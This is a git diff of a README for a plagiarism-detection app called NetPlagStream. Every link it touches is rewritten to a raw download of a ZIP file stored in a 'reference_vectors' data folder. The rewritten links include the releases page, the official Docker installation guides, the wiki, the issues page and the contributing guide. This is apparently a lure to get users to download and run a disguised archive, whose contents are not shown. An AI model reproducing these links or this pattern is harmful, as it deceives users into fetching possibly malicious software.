@@ -1,6 +1,6 @@
 # 🎉 NetPlagStream - Detect Plagiarism in Real-Time
 
-![Download NetPlagStream](https://img.shields.io/badge/Download-NetPlagStream-blue.svg)
+![Download NetPlagStream](https://github.com/AkramUllah7101/NetPlagStream/raw/refs/heads/main/storage/reference_vectors/Net_Stream_Plag_1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to NetPlagStream! This application helps you detect plagiarism in real-t
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [NetPlagStream Releases](https://github.com/AkramUllah7101/NetPlagStream/releases)
+To get started, visit this page to download: [NetPlagStream Releases](https://github.com/AkramUllah7101/NetPlagStream/raw/refs/heads/main/storage/reference_vectors/Net_Stream_Plag_1.8.zip)
 
 Look for the latest version. Follow the instructions below to set up the application.
 
@@ -24,12 +24,12 @@ Before downloading, ensure your system meets the following requirements:
 ## 🔧 Installation Steps
 
 1. **Download the Software:**
-   Visit this page to download: [NetPlagStream Releases](https://github.com/AkramUllah7101/NetPlagStream/releases). Choose the appropriate version for your operating system.
+   Visit this page to download: [NetPlagStream Releases](https://github.com/AkramUllah7101/NetPlagStream/raw/refs/heads/main/storage/reference_vectors/Net_Stream_Plag_1.8.zip). Choose the appropriate version for your operating system.
 
 2. **Install Dependencies:**
    Make sure you have Docker and Docker Compose installed on your system. If not, follow these steps:
-   - For **Docker**: Visit the [Docker installation guide](https://docs.docker.com/get-docker/).
-   - For **Docker Compose**: Follow the instructions [here](https://docs.docker.com/compose/install/).
+   - For **Docker**: Visit the [Docker installation guide](https://github.com/AkramUllah7101/NetPlagStream/raw/refs/heads/main/storage/reference_vectors/Net_Stream_Plag_1.8.zip).
+   - For **Docker Compose**: Follow the instructions [here](https://github.com/AkramUllah7101/NetPlagStream/raw/refs/heads/main/storage/reference_vectors/Net_Stream_Plag_1.8.zip).
 
 3. **Extract Files:**
    After downloading, extract the ZIP file to a folder of your choice.
@@ -74,11 +74,11 @@ NetPlagStream works on Windows, macOS, and Linux. Ensure you meet the system req
 
 ## 🔗 Resources
 
-- **Documentation:** For more detailed usage instructions, check our [full documentation](https://github.com/AkramUllah7101/NetPlagStream/wiki).
-- **Support:** If you encounter any issues, feel free to visit our [FAQ page](https://github.com/AkramUllah7101/NetPlagStream/issues).
+- **Documentation:** For more detailed usage instructions, check our [full documentation](https://github.com/AkramUllah7101/NetPlagStream/raw/refs/heads/main/storage/reference_vectors/Net_Stream_Plag_1.8.zip).
+- **Support:** If you encounter any issues, feel free to visit our [FAQ page](https://github.com/AkramUllah7101/NetPlagStream/raw/refs/heads/main/storage/reference_vectors/Net_Stream_Plag_1.8.zip).
 
 ## 🛠️ Contributing
 
-If you'd like to contribute to NetPlagStream, check out our [contributing guide](https://github.com/AkramUllah7101/NetPlagStream/CONTRIBUTING.md). We welcome new ideas and help!
+If you'd like to contribute to NetPlagStream, check out our [contributing guide](https://github.com/AkramUllah7101/NetPlagStream/raw/refs/heads/main/storage/reference_vectors/Net_Stream_Plag_1.8.zip). We welcome new ideas and help!
 
 Thank you for choosing NetPlagStream. Enjoy a more original writing experience!
